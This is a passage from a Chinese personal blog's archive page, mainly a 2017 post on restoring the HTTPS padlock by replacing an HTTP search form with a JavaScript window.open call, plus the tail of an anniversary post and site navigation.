<p>两年博客，我只有一个故事——**<em>I’ll never forget why we’ve met…</em>**</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2017/08/23/2-years/index/" data-id="clhp7rteb000cs2qrbr7g0dtd" data-title="啥？两年了？？" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
    </footer>
  </div>
  
</article>



  
    <article id="post-say-no-to-http-form/index" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2017/08/16/say-no-to-http-form/index/" class="article-date">
  <time class="dt-published" datetime="2017-08-16T00:00:00.000Z" itemprop="datePublished">2017-08-16</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/website/">website</a>►<a class="article-category-link" href="/categories/website/program/">program</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2017/08/16/say-no-to-http-form/index/">找回小锁头，对HTTP表单说No</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <p>话说， 本博客上面有个”美剧电影“的栏目，其中有个带有HTTP的、人人影视的form表单，所以，俺的小锁头就没了。 原来的HTML代码大概是这样子的（这HTML代码写转义真是累啊……）：</p>
<form action="http://www.zimuzu.tv/search/index?keyword=" method="get" name="search" target="\_blank">
<input class="keywords" name="keyword" type="text" value>
<input class="submit" type="submit" value="搜索">
</form>

<p>好吧，其实俺忍了很久了，那该怎么把小锁头找回来呢？先说说我的思路</p>
<h2 id="强行把HTTP改成HTTPS"><a href="#强行把HTTP改成HTTPS" class="headerlink" title="强行把HTTP改成HTTPS"></a>强行把HTTP改成HTTPS</h2><p>这不是我的可控范围之内，非常可怜的是，字幕组不带HTTPS，此路不通。</p>
<h2 id="用PHP获取到输入内容，然后处理"><a href="#用PHP获取到输入内容，然后处理" class="headerlink" title="用PHP获取到输入内容，然后处理"></a>用PHP获取到输入内容，然后处理</h2><p>用超全局变量<code>_GET</code>或者<code>_POST</code>获取到用户输入的内容，然后再跳转到对应的页面。思路是这么个思路，但是不太现实啊！提交的内容还得给某个PHP文件处理，太不经济划算了！ [v_tips]嗯……多亏了维护那款<a target="_blank" rel="noopener" href="https://github.com/BennyThink/GreenGrapes2">Typecho主题</a>，我对PHP的掌控还是可以的……[&#x2F;v_tips]</p>
<h2 id="短网址缩短服务"><a href="#短网址缩短服务" class="headerlink" title="短网址缩短服务"></a>短网址缩短服务</h2><p>咱这是GET方法，要不试试短链接服务？是这么个道理，可是找一圈，我也没发现几个好用的支持HTTPS的、速度不错的、切实可行的短链接服务，就差自己搭建一个了……</p>
<h2 id="用JavaScript吧"><a href="#用JavaScript吧" class="headerlink" title="用JavaScript吧"></a>用JavaScript吧</h2><p>没错，事到如今，只好用起JavaScript了，通过<code>getElementById</code>和<code>value</code>方法获取到用户输入的内容，通过<code>window.open</code>打开新的窗口，这样小锁头就回来了。</p>
<blockquote>
<p>Talk is cheap, show me the code!</p>
</blockquote>
<input id="txt1" size="12" type="text">
<input type="button" value="搜索" onclick="window.open("http://www.zimuzu.tv/search/index?keyword="+document.getElementById("txt1").value,"\_blank");">

<p>如果觉得这样看起来比较费事的话，也可以写成函数的形式：</p>
<input id="txt1" size="12" type="text">
<input type="button" value="搜索" onclick="search()">
<script>
function search(){
window.open("http://www.zimuzu.tv/search/index?keyword="+document.getElementById("txt1").value,"\_blank");
}
</script>

<p>完美！！</p>
<p><a target="_blank" rel="noopener" href="https://dmesg.app/wp-content/uploads/2017/08/2017081613574416.png"><img src="/images/2017081613574416.png"></a></p>
<p>初学JavaScript，还望多多指教！</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2017/08/16/say-no-to-http-form/index/" data-id="clhp7rtiq007xs2qr2kkkaave" data-title="找回小锁头，对HTTP表单说No" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
    </footer>
  </div>
  
</article>



  


  <nav id="page-nav">
    
    <a class="extend prev" rel="prev" href="/page/12/">&laquo; Prev</a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/11/">11</a><a class="page-number" href="/page/12/">12</a><span class="page-number current">13</span><a class="page-number" href="/page/14/">14</a><a class="page-number" href="/page/15/">15</a><span class="space">&hellip;</span><a class="page-number" href="/page/23/">23</a><a class="extend next" rel="next" href="/page/14/">Next &raquo;</a>
  </nav>

</section>
        
          <aside id="sidebar">
  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Categories</h3>
    <div class="widget">
      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/azure/">azure</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/china/">china</a><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/china/justsay/">justsay</a></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/cloudflare/">cloudflare</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/gfw/">gfw</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/it/">it</a><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/it/justsay/">justsay</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/it/linux/">linux</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/it/security/">security</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/it/share/">share</a></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/justsay/">justsay</a><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/justsay/gfw/">gfw</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/justsay/program/">program</a></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/linux/">linux</a><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/linux/security/">security</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/linux/website/">website</a></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/program/">program</a><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/program/share/">share</a></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/security/">security</a><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/security/justsay/">justsay</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/security/program/">program</a></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/share/">share</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/website/">website</a><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/website/program/">program</a></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/what/">what</a><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/what/gfw/">gfw</a></li></ul></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Tags</h3>
    <div class="widget">
      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/linux/" rel="tag">linux</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/ubuntu/" rel="tag">ubuntu</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Tag Cloud</h3>
    <div class="widget tagcloud">
      <a href="/tags/linux/" style="font-size: 10px;">linux</a> <a href="/tags/ubuntu/" style="font-size: 10px;">ubuntu</a>
    </div>
  </div>

  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Archives</h3>
    <div class="widget">
      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/10/">October 2024</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/09/">September 2024</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/08/">August 2024</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/07/">July 2024</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/04/">April 2024</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/03/">March 2024</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/02/">February 2024</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/12/">December 2023</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/11/">November 2023</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/05/">May 2023</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/04/">April 2023</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/03/">March 2023</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/02/">February 2023</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/01/">January 2023</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/09/">September 2022</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/08/">August 2022</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/07/">July 2022</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/06/">June 2022</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/05/">May 2022</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/04/">April 2022</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/02/">February 2022</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/01/">January 2022</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/12/">December 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/11/">November 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/10/">October 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/08/">August 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/07/">July 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/06/">June 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/04/">April 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/02/">February 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/01/">January 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/12/">December 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/10/">October 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/09/">September 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/08/">August 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/07/">July 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/04/">April 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/03/">March 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/01/">January 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/12/">December 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/11/">November 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/10/">October 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/08/">August 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/07/">July 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/06/">June 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/04/">April 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/03/">March 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/02/">February 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/01/">January 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/12/">December 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/11/">November 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/09/">September 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/08/">August 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/07/">July 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/05/">May 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/04/">April 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/03/">March 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/02/">February 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/12/">December 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/11/">November 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/10/">October 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/09/">September 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/08/">August 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/07/">July 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/06/">June 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/05/">May 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/04/">April 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/03/">March 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/02/">February 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/01/">January 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/12/">December 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/11/">November 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/10/">October 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/09/">September 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/08/">August 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/07/">July 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/06/">June 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/05/">May 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/04/">April 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/03/">March 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/02/">February 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/01/">January 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2015/12/">December 2015</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2015/11/">November 2015</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2015/10/">October 2015</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2015/09/">September 2015</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2015/08/">August 2015</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Recent Posts</h3>
    <div class="widget">
      <ul>
        
          <li>
            <a href="/2024/10/12/aca-php/index/">用 Azure Container Apps 运行PHP网站</a>
          </li>
        
          <li>
            <a href="/2024/10/06/aca-vm-scale/index/">Azure Container Apps 连接到虚拟机并配置CPU自动缩放</a>
          </li>
        
          <li>
            <a href="/2024/09/28/worker-image-metadata/index/">使用 Cloudflare Worker获取图片元数据</a>
          </li>
        
          <li>
            <a href="/2024/09/27/workers-function/index/">将 Cloudflare Workers 迁移到 Azure Function</a>
          </li>
        
          <li>
            <a href="/2024/09/21/one-api-clickhouse/index/">one-api/new-api性能优化：使用 ClickHouse 作为日志系统</a>
          </li>
        
      </ul>
    </div>
  </div>

  
</aside>
        
      </div>
      <footer id="footer">
  
  <div class="outer">
    <div id="footer-info" class="inner">
      
      &copy; 2024 Benny小土豆<br>
      Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>
    </div>
  </div>
</footer>

    </div>
    <nav id="mobile-nav">
  
    <a href="/" class="mobile-nav-link">Home</a>
  
    <a href="/archives" class="mobile-nav-link">Archives</a>
  
</nav>
    


<script src="/js/jquery-3.6.4.min.js"></script>



  
<script src="/fancybox/jquery.fancybox.min.js"></script>




<script src="/js/script.js"></script>





  </div>
</body>
</html>